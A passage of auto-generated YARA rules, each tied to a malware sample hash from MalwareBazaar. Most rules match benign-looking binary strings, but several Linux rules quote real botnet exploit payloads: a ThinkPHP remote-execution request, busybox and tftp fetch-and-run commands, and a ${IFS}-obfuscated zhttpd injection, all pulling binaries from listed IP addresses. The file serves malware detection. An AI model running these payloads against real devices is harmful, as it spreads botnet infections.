        $s5 = ".rsrc"
        $s6 = "SetThreadPreferredUILanguages"
        $s7 = "kernel32"
        $s8 = "SetProcessPreferredUILanguages"
        $s9 = "GetNativeSystemInfo"
        $s10 = "Could not overwrite file \"%s\"."
        $s11 = "Could not create file \"%s\"."
        $s12 = "No \"HelpText\" in the configuration file."
        $s13 = "\"setup.exe\""
        $s14 = "Could not find \"setup.exe\"."
        $s15 = "Could not delete file or folder \"%s\"."
        $s16 = "Could not create folder \"%s\"."
        $s17 = "Could not write SFX configuration."
        $s18 = "Could not read SFX configuration or configuration not found."
        $s19 = "Could not open archive file \"%s\"."
        $s20 = "Could not get SFX filename."
    condition:
        uint32(0) == 0x00605a4d and
        filesize < 2587KB and
        all of them
}

rule Windows_b591efa59ecfcfa300b5e23baa8ab72ac89a0ea91e72d717062f456a279cfe01
{
    meta:
        description = "Auto ML: b591efa59ecfcfa300b5e23baa8ab72ac89a0ea91e72d717062f456a279cfe01"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "openDestinationFolderToolStripMenuItem1"
        $s5 = "ReadInt32"
        $s6 = "<Module>"
        $s7 = "get_FormatID"
        $s8 = "get_GitHubURI"
        $s9 = "set_GitHubURI"
        $s10 = "System.IO"
        $s11 = "get_TimerIntervalS"
        $s12 = "set_TimerIntervalS"
        $s13 = "get_DestinationFolderS"
        $s14 = "set_DestinationFolderS"
        $s15 = "get_FileFormatS"
        $s16 = "set_FileFormatS"
        $s17 = "get_DeviceIndexS"
        $s18 = "set_DeviceIndexS"
        $s19 = "get_JpegQualityS"
        $s20 = "set_JpegQualityS"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 674KB and
        all of them
}

rule Linux_126f65a9087ee74ff1249bb28ce437b2884fb880e7f13fba0d287e31b6fa0295
{
    meta:
        description = "Auto ML: 126f65a9087ee74ff1249bb28ce437b2884fb880e7f13fba0d287e31b6fa0295"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://141.98.10.85/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = "processor"
        $s10 = "/sys/devices/system/cpu"
        $s11 = "_Unwind_VRS_Get"
        $s12 = "_Unwind_VRS_Set"
        $s13 = "_Unwind_GetCFA"
        $s14 = "_Unwind_Complete"
        $s15 = "_Unwind_DeleteException"
        $s16 = "_Unwind_GetTextRelBase"
        $s17 = "_Unwind_GetDataRelBase"
        $s18 = "__gnu_Unwind_ForcedUnwind"
        $s19 = "__gnu_Unwind_Resume"
        $s20 = "__gnu_Unwind_RaiseException"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 150KB and
        all of them
}

rule Android_b5d5b9ed2734ef4402384c01d7d1a7a31df4fbccbf60a913460f2db56e220080
{
    meta:
        description = "Auto ML: b5d5b9ed2734ef4402384c01d7d1a7a31df4fbccbf60a913460f2db56e220080"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HH228673587425-7pgvh8bkt1dn6vs751trg389s4vo3bui.apps.googleusercontent.com"
        $s2 = "&&An error has occurred opening the file"
        $s3 = "Authentication canceled by user."
        $s4 = "<<Cannot find an app that supports opening files of this type."
        $s5 = "Close"
        $s6 = "Connecting to debugger..."
        $s7 = "Debug Settings"
        $s8 = "Disable Sampling Profiler"
        $s9 = "Download failed"
        $s10 = "Download image"
        $s11 = "Downloading"
        $s12 = "Enable Sampling Profiler"
        $s13 = "Error downloading attachment"
        $s14 = "Error loading more results"
        $s15 = "Failed to connect to debugger!"
        $s16 = "NNFailed to load bundle. Try restarting the bundler or reconnecting your device."
        $s17 = "''Fingerprint operation canceled by user."
        $s18 = "Loading from %1$s"
        $s19 = "Mark as read"
        $s20 = "Please wait. Downloading %s"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 43736KB and
        all of them
}

rule Linux_b5f00e256c6a42e17e09cbfb08a5d1260400847bf06bc61f2988b20b12a91373
{
    meta:
        description = "Auto ML: b5f00e256c6a42e17e09cbfb08a5d1260400847bf06bc61f2988b20b12a91373"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 149KB and
        all of them
}

rule Windows_b5fbb6b68bdfdce41639d893cc56d10024e4cc251d9bb867cd25e68c5eb5b3e3
{
    meta:
        description = "Auto ML: b5fbb6b68bdfdce41639d893cc56d10024e4cc251d9bb867cd25e68c5eb5b3e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 908KB and
        all of them
}

rule Windows_b601d1ef1cb314076912264021dc3dde56e5697cd344fc6da9b954230ccf8aaf
{
    meta:
        description = "Auto ML: b601d1ef1cb314076912264021dc3dde56e5697cd344fc6da9b954230ccf8aaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Drawing.Drawing2D"
        $s6 = "GetLI"
        $s7 = "System.IO"
        $s8 = "get_gvQP"
        $s9 = "System.Collections.Generic"
        $s10 = "get_CanRead"
        $s11 = "buttonLoad"
        $s12 = "get_windSpeed"
        $s13 = "set_Enabled"
        $s14 = "set_FormattingEnabled"
        $s15 = "<windSpeed>k__BackingField"
        $s16 = "<temperature>k__BackingField"
        $s17 = "<windDirection>k__BackingField"
        $s18 = "set_AutoScaleMode"
        $s19 = "FileMode"
        $s20 = "set_SizeMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 637KB and
        all of them
}

rule Windows_b60d52fb9609a44a180110b46007bfc5f21e16189a667a17eb54e16cb3890c3e
{
    meta:
        description = "Auto ML: b60d52fb9609a44a180110b46007bfc5f21e16189a667a17eb54e16cb3890c3e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetByNhom>b__0"
        $s5 = "DbSet`1"
        $s6 = "HashSet`1"
        $s7 = "<Module>"
        $s8 = "get_vFBFEB"
        $s9 = "get_Magenta"
        $s10 = "get_selectedLienLac"
        $s11 = "System.Collections.Generic"
        $s12 = "Load"
        $s13 = "set_FormattingEnabled"
        $s14 = "get_principal_id"
        $s15 = "set_principal_id"
        $s16 = "get_diagram_id"
        $s17 = "set_diagram_id"
        $s18 = "get_ButtonFace"
        $s19 = "CreateInstance"
        $s20 = "set_DataSource"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 807KB and
        all of them
}

rule Linux_b6127e01ed91f6d02551decb4e0fe18b8a2dcd0ba5c17919c91e1ecbbac70373
{
    meta:
        description = "Auto ML: b6127e01ed91f6d02551decb4e0fe18b8a2dcd0ba5c17919c91e1ecbbac70373"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "wgetX"
        $s2 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s3 = "user"
        $s4 = "User"
        $s5 = "shell"
        $s6 = "system"
        $s7 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s8 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s9 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s10 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s11 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s12 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s13 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s14 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s15 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s16 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s17 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s18 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s19 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s20 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB and
        all of them
}

rule Windows_b61504da1a042a26350f9b97750f0361a904eb16b69ecde0fbb22ac7eab788c5
{
    meta:
        description = "Auto ML: b61504da1a042a26350f9b97750f0361a904eb16b69ecde0fbb22ac7eab788c5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "kernel32.dll"
        $s6 = "user32"
        $s7 = "user32.dll"
        $s8 = "kernel32"
        $s9 = "wininet.dll"
        $s10 = "Kernel32.dll"
        $s11 = "advapi32.dll"
        $s12 = "shlwapi.dll"
        $s13 = "GetTempPathA"
        $s14 = "GetCurrentProcessId"
        $s15 = "EnumWindows"
        $s16 = "IsWindowVisible"
        $s17 = "GetWindowThreadProcessId"
        $s18 = "GetWindowTextA"
        $s19 = "GetClassNameA"
        $s20 = "CallWindowProcA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB and
        all of them
}

rule Windows_b61c3baadd541bcafad124668888e322d70720335a6f46173b489a47d5b66c1c
{
    meta:
        description = "Auto ML: b61c3baadd541bcafad124668888e322d70720335a6f46173b489a47d5b66c1c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "LevelUp.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{B5DFC02B-B20B-419D-BBC3-0A2601593624}"
        $s15 = "<Module>{27ec75bb-3250-4d92-9964-2225b359bed4}"
        $s16 = "get_Days"
        $s17 = "kernel32.dll"
        $s18 = "CreateThread"
        $s19 = "get_Message"
        $s20 = "WriteLine"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 435KB and
        all of them
}

rule Windows_b62170f159d7dd4f853913e3c6a3a41fb6699e597d88cea9f08ffa93266084ff
{
    meta:
        description = "Auto ML: b62170f159d7dd4f853913e3c6a3a41fb6699e597d88cea9f08ffa93266084ff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "SerialRealTimeCommunicationSystemIii"
        $s5 = "ConnectivityFaultManagementOrOperationsAdministrationManagement"
        $s6 = "payloadPacketOrData"
        $s7 = "FragmentOffsetAndFlagsLength"
        $s8 = "FragmentOffsetAndFlagsPosition"
        $s9 = "PayloadLengthLength"
        $s10 = "PayloadLengthPosition"
        $s11 = "Http"
        $s12 = "DataOffsetAndFlagsLength"
        $s13 = "WindowSizeLength"
        $s14 = "DataOffsetAndFlagsPosition"
        $s15 = "WindowSizePosition"
        $s16 = "HardwareAddressTypePosition"
        $s17 = "HardwareAddressLengthPosition"
        $s18 = "SenderHardwareAddressPosition"
        $s19 = "TargetHardwareAddressPosition"
        $s20 = "TargetProtocolAddressPosition"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 457KB and
        all of them
}

rule Linux_b66d2fcb89ddd85d59e01807ea386b2fddfe8e7ad44d4d06beb6c305f643df6a
{
    meta:
        description = "Auto ML: b66d2fcb89ddd85d59e01807ea386b2fddfe8e7ad44d4d06beb6c305f643df6a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "socket:["
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB and
        all of them
}

rule Windows_12799551e5f50de2d5bec3973d53e745d66b4f41ede09197630a8b6cdac296c2
{
    meta:
        description = "Auto ML: 12799551e5f50de2d5bec3973d53e745d66b4f41ede09197630a8b6cdac296c2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4700KB and
        all of them
}

rule Windows_b67319d5978b2236bb8a735b1838b18b6432cb835fce1b9b08ff2d68e012bc50
{
    meta:
        description = "Auto ML: b67319d5978b2236bb8a735b1838b18b6432cb835fce1b9b08ff2d68e012bc50"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "_IFileSV"
        $s7 = "System.Collections.Generic"
        $s8 = "get_bscFAOZd"
        $s9 = "get_Checked"
        $s10 = "set_Checked"
        $s11 = "set_Enabled"
        $s12 = "set_FormattingEnabled"
        $s13 = "CreateInstance"
        $s14 = "set_DataSource"
        $s15 = "set_AutoScaleMode"
        $s16 = "FileMode"
        $s17 = "set_AutoSizeMode"
        $s18 = "set_ColumnHeadersHeightSizeMode"
        $s19 = "set_AutoSizeColumnsMode"
        $s20 = "set_Image"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 973KB and
        all of them
}

rule Windows_b685d98c96230b80dfe1b518d77326c513c84af86aa4047602b0da3215574981
{
    meta:
        description = "Auto ML: b685d98c96230b80dfe1b518d77326c513c84af86aa4047602b0da3215574981"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "processorArchitecture=\"X86\""
        $s4 = "name=\"Enigma.exe\""
        $s5 = "type=\"win32\" />"
        $s6 = "type=\"win32\""
        $s7 = "name=\"Microsoft.Windows.Common-Controls\""
        $s8 = "processorArchitecture=\"X86\""
        $s9 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s10 = "http://pki-ocsp.symauth.com0"
        $s11 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s12 = "kernel32.dll"
        $s13 = "user32.dll"
        $s14 = "advapi32.dll"
        $s15 = "oleaut32.dll"
        $s16 = "shell32.dll"
        $s17 = "version.dll"
        $s18 = "CRYPT32.dll"
        $s19 = "SHLWAPI.dll"
        $s20 = "gdiplus.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1832KB and
        all of them
}

rule Windows_b6bc62948875b3b8f74a1726bcbce53e74f1c918b0676d20e6bbf76f9f069ae2
{
    meta:
        description = "Auto ML: b6bc62948875b3b8f74a1726bcbce53e74f1c918b0676d20e6bbf76f9f069ae2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Connection`1"
        $s5 = "get_Item1"
        $s6 = "kernel32"
        $s7 = "Microsoft.Win32"
        $s8 = "ReadUInt32"
        $s9 = "ReadInt32"
        $s10 = "WriteInt32"
        $s11 = "GetInt32"
        $s12 = "SQLITE_CONFIG_GETPCACHE2"
        $s13 = "get_Item2"
        $s14 = "sqlite3_close_v2"
        $s15 = "sqlite3_open_v2"
        $s16 = "get_Item3"
        $s17 = "ReadInt64"
        $s18 = "GetInt64"
        $s19 = "GetTickCount64"
        $s20 = "get_Item4"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 856KB and
        all of them
}

rule Windows_b6d3fe2a1b36d208fb9451e694bc9ca45b6cc56600fb0a2aa8d49629345d0ecd
{
    meta:
        description = "Auto ML: b6d3fe2a1b36d208fb9451e694bc9ca45b6cc56600fb0a2aa8d49629345d0ecd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4007KB and
        all of them
}

rule Windows_b6e0b3fdd03c8e6da4709362e6c1dc95e5af4443a5bb6335ab848c1f26c0bee5
{
    meta:
        description = "Auto ML: b6e0b3fdd03c8e6da4709362e6c1dc95e5af4443a5bb6335ab848c1f26c0bee5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "4I\\JCMd"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "CorExitProcess"
        $s9 = "An application has made an attempt to load the C runtime library incorrectly."
        $s10 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s11 = "- Attempt to initialize the CRT more than once."
        $s12 = "- unable to open console device"
        $s13 = "- unexpected multithread lock error"
        $s14 = "- not enough space for thread data"
        $s15 = "- floating point support not loaded"
        $s16 = "SystemFunction036"
        $s17 = "ADVAPI32.DLL"
        $s18 = "GetProcessWindowStation"
        $s19 = "GetUserObjectInformationA"
        $s20 = "GetLastActivePopup"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 732KB and
        all of them
}

rule Linux_b6f1a498490d42e2b8ba425f4392715377f34033115c6ef5ed15ec568048bd19
{
    meta:
        description = "Auto ML: b6f1a498490d42e2b8ba425f4392715377f34033115c6ef5ed15ec568048bd19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 38KB and
        all of them
}

rule Linux_b70a3e0a007a775b4bb39f951e43ce0b094512e7cf3205e7d4bb40e5c3a6275b
{
    meta:
        description = "Auto ML: b70a3e0a007a775b4bb39f951e43ce0b094512e7cf3205e7d4bb40e5c3a6275b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/proc/%s/cmdline"
        $s7 = "/bin/systemd"
        $s8 = "/var/Challenget"
        $s9 = "[killer] Failed to create child process."
        $s10 = "deleted"
        $s11 = "payloadasdf"
        $s12 = "GET /%s HTTP/1.0"
        $s13 = "User-Agent: Update v1.0"
        $s14 = "GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;"
        $s15 = "No such file or directory"
        $s16 = "No such process"
        $s17 = "Interrupted system call"
        $s18 = "Bad file descriptor"
        $s19 = "No child processes"
        $s20 = "Resource temporarily unavailable"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 143KB and
        all of them
}

rule Windows_b74b718bc7d748634e8522ee94e83bf48ca66942c9f8bf88252d908910982fdd
{
    meta:
        description = "Auto ML: b74b718bc7d748634e8522ee94e83bf48ca66942c9f8bf88252d908910982fdd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6343KB and
        all of them
}

rule Windows_b74ed680f0ede6f0d9d864481aee4f7e12137f25a4ad071524a2ef7e9a61a7ba
{
    meta:
        description = "Auto ML: b74ed680f0ede6f0d9d864481aee4f7e12137f25a4ad071524a2ef7e9a61a7ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4759KB and
        all of them
}

rule Windows_b7a46b6c3fd98866134d8a5831a82b7444c0c2d5fe6692adfab92051e3541c7f
{
    meta:
        description = "Auto ML: b7a46b6c3fd98866134d8a5831a82b7444c0c2d5fe6692adfab92051e3541c7f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Framework.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{6F74592A-3FE6-4C48-9B41-4D4E50A8941D}"
        $s15 = "<Module>{8f0ba1fe-7679-4eb1-91c2-cea57145522b}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "Module"
        $s19 = "System.Collections.Generic"
        $s20 = "System.Collections"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 397KB and
        all of them
}

rule Windows_128c9389df360d8efb8936c7cfd12656a6a063d1a57793cf203e8f77d9d170bd
{
    meta:
        description = "Auto ML: 128c9389df360d8efb8936c7cfd12656a6a063d1a57793cf203e8f77d9d170bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "delete"
        $s7 = "delete[]"
        $s8 = "`placement delete closure'"
        $s9 = "`placement delete[] closure'"
        $s10 = "`local static thread guard'"
        $s11 = "FlsGetValue"
        $s12 = "FlsSetValue"
        $s13 = "CorExitProcess"
        $s14 = "AreFileApisANSI"
        $s15 = "AppPolicyGetProcessTerminationMethod"
        $s16 = "CLRCreateInstance"
        $s17 = "CreateFullTrustSandbox"
        $s18 = ".text$di"
        $s19 = ".text$mn"
        $s20 = ".text$mn$00"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 980KB and
        all of them
}

rule Windows_b7a53067b4b97c4bcea3aa0e0f7c3366df68f5efc0e7d990dc32a8191fb1f951
{
    meta:
        description = "Auto ML: b7a53067b4b97c4bcea3aa0e0f7c3366df68f5efc0e7d990dc32a8191fb1f951"
